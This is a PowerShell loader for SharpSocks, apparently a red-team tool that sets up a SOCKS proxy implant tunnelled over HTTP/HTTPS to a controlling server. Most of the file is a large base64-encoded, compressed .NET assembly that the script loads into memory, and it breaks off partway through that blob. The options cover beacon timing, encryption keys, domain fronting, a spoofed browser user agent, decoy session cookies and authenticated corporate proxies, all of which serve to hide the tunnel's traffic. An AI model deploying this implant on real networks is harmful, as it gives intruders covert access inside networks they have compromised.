$Global:SocksClientLoaded = $False
$Global:SocksServerLoaded = $False
$Global:Socks = $null
$Global:BoolStart = $null
$iLogOutput = $null
$Comms = $null
function SharpSocks
{
    <#
    .Synopsis
        Socks Proxy written in C# for .NET v4

        Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell

        SharpSocks 2020 Nettitude
        Rob Maslen @rbmaslen

    .DESCRIPTION
        PS C:\> Usage: SharpSocks -Uri <Host>
    .EXAMPLE
        Start the Implant(Client) specifying the web server (http://127.0.0.1:8081), the encryption keys and channel id. Also specify a list of URLs to use when making HTTP Request. Set the beacon time to 0.5 seconds
        PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "site/review/access.php","upload/data/images" -Beacon 500
    .EXAMPLE
        Same as above using different list of URLs
        PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 500
    .EXAMPLE
        Sames as above but connect out via an authenticated proxy server
        PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -ProxyUser bob -ProxyPass pass -ProxyDomain dom -ProxyUrl http://10.150.10.1:8080 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 500
    #>
    param(
    [Parameter(Mandatory=$True)][string]$Uri,
    [Parameter(Mandatory=$False)]$URLs="Upload",
    [Parameter(Mandatory=$False)][switch]$Server,
    [Parameter(Mandatory=$False)][switch]$Client,
    [Parameter(Mandatory=$False)][int]$SocksPort=43334,
    [Parameter(Mandatory=$False)][string]$Channel,
    [Parameter(Mandatory=$False)][string]$IPAddress="0.0.0.0",
    [Parameter(Mandatory=$False)][string]$DomainFrontURL,
    [Parameter(Mandatory=$False)][int]$Beacon="400",
    [Parameter(Mandatory=$False)][string]$Key,
    [Parameter(Mandatory=$False)][switch]$Insecure,
    [Parameter(Mandatory=$False)][string]$UserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
    [Parameter(Mandatory=$False)][string]$Cookie1="ASP.NET_SessionId",
    [Parameter(Mandatory=$False)][string]$Cookie2="__RequestVerificationToken",
    [Parameter(Mandatory=$False, HelpMessage="Certificate to be used by the web server, must be of type System.Security.Cryptography.X509Certificates.X509Certificate2")][System.Security.Cryptography.X509Certificates.X509Certificate2]$TLSServerCertificate,
    [Parameter(Mandatory=$False)][string]$ProxyURL,
    [Parameter(Mandatory=$False)][string]$ProxyDomain,
    [Parameter(Mandatory=$False)][string]$ProxyUser,
    [Parameter(Mandatory=$False)][string]$ProxyPassword
    )

    echo "[-] Loading Assemblies"
    if ($psversiontable.CLRVersion.Major -lt 3) {
        echo "Not running on CLRVersion 4 or above. Try 'migrate' to use unmanaged powershell"
    }
    else {
        if (($SocksClientLoaded -ne "TRUE") -and ($Client.IsPresent)) {
            $Script:SocksClientLoaded = "TRUE"
            echo "[-] Loading Client Assembly"
            $PS = "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